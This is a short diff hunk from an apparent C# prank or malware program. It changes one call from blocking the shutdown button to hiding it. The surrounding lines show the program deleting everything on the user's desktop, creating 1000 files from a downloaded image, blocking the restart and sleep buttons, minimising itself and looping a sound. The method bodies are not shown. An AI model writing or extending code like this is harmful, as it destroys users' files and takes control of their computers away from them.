@@ -92,7 +92,7 @@ namespace bramerto_rob_2._0
             s.DeleteALLFromDesktop();
             s.CreateFilesOnDesktop(1000, "https://rozetked.me/images/uploads/fJ8LPcfByPPv.jpg", "Shrek.ru");
             s.BlockRestartButton();
-            s.BlockShutDownButton();
+            s.HideShutDownButton();
             s.BlockSleepButton();
             this.WindowState = FormWindowState.Minimized;
             sp2.PlayLooping();
